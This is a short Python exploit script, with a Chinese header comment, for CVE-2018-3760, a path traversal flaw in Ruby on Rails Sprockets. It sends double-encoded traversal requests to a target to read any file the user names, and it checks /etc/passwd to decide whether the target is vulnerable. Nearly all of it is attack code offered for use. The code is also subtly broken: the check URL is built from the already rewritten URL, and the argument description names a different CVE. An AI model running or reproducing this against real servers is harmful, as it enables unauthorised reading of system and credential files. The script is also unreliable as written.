'''
CVE-2018-3760 Ruby On Rails 路径穿越漏洞
writen by ophxc
漏洞描述:Ruby On Rails在开发环境下使用Sprockets作为静态文件服务器，Ruby On Rails是著名Ruby Web开发框架，Sprockets是编译及分发静态资源文件的Ruby库
'''
import requests
import argparse

parser=argparse.ArgumentParser(description="usage of CVE-2018-7600")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-f", "--filename", help="the file you want to read", required=True)

args=parser.parse_args()

url=args.url
file=args.filename

url="http://"+url+"/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e"+file

url2="http://"+url+"/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"

res1=requests.get(url=url)
res2=requests.get(url=url2)

if res2.status_code == 200 and "root" in res2.text:
    print("it's vulnable")
    print(res1.text)
else:
    print("it's seems unvulnable")